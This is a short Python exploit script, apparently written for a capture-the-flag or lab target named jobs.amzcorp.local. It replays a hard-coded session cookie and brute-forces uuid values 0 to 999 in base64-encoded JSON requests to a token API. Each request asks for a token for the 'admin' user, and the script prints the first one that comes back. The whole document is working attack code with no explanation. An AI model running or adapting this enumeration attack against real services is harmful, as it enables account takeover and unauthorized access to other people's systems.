#!/usr/bin/python3
import requests
import base64
import sys
from pwn import log

bar = log.progress("uuid")

target = "http://jobs.amzcorp.local/api/v4/tokens/get"

cookies = {
    "session": ".eJwtjs1qAzEMhN_F51L8J0vKqS-R8yJLMg3NZmF3cyp99zq0l4H5mGHmOyxj9-MzXM796W9huVm4hJYoFcGCktwAa0Jz6GTa1JXNhgr3Pjixm8Y6yug5E7CNGaRhEZhrFqm5xtKQPAMMFOycqVbqPQpkjKBE3YpwtE5CmSRmxAoU5pHn4fvfG255Aj32sZzblz8mUvSSzDoOZC_FC4hqa81SJYtWsA9vDHH2fJXbfVZOP86Pl7zrtk6-b3ef-Dpnjmlfcw9Z_T8Zfn4BTRtTXA.Zlc6_A.Lr2rKqZGFovHCZMq6F15N6NXLNE"
}
headers = {"Content-Type": "application/json"}

for uuid in range(0, 1000):
    data = '{"get_token": "True", "uuid": "%d", "username": "admin"}' % uuid
    encoded_data = base64.b64encode(data.encode('ascii')).decode('ascii')
    json_data = {"data": encoded_data}

    request = requests.post(target, headers=headers, cookies=cookies, json=json_data)
    bar.status(uuid)

    if "Invalid" not in request.text:
        print(request.text.strip())
        bar.success(uuid)
        sys.exit(0)
